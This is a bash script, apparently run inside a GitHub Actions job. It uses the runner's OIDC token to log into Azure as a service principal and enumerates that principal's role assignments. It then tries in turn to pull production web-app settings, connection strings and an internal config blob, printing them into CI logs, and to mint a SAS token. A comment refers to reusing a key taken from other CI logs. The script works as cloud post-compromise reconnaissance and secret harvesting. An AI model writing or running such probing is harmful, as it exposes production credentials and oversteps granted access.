#!/usr/bin/env bash
set -x

# Use az CLI (pre-installed on GitHub runner) with OIDC login
az login --federated-token "$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)" \
  --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --output none 2>&1 || true
az account set -s "$AZURE_SUBSCRIPTION_ID" 2>&1 || true
echo "=== logged in as ==="
az account show --query '{user:user.name,tenant:tenantId}' 2>&1

# List ALL role assignments for our SP
echo "=== MY ROLE ASSIGNMENTS ==="
az role assignment list --assignee "$AZURE_CLIENT_ID" --all --output table 2>&1

# Try to read app settings via az webapp
echo "=== WEBAPP CONFIG ==="
az webapp config appsettings list -n app-tbl-storefront-prod -g rg-tbl-platform-prod-sea 2>&1 | head -c 500

# Try show connection string
echo "=== CONNECTION STRINGS ==="
az webapp config connection-string list -n app-tbl-storefront-prod -g rg-tbl-platform-prod-sea 2>&1 | head -c 500

# Try az storage with different auth methods
echo "=== STORAGE BLOB LIST (--auth-mode login) ==="
az storage blob list --account-name sttblappcfgprodx3euoz -c config --auth-mode login --output table 2>&1

# Try download the blob
echo "=== STORAGE BLOB DOWNLOAD ==="
az storage blob download --account-name sttblappcfgprodx3euoz -c config -n internal-config.json --auth-mode login -f /tmp/config.json 2>&1
cat /tmp/config.json 2>/dev/null

# Try with key from cilogs
echo "=== STORAGE: use cilogs key to generate SAS for appcfg? ==="
# Different accounts = different keys, won't work. But try user delegation SAS:
az storage blob generate-sas --account-name sttblappcfgprodx3euoz -c config -n internal-config.json \
  --permissions r --expiry 2026-12-01 --auth-mode login --as-user 2>&1

echo "=== DONE ==="
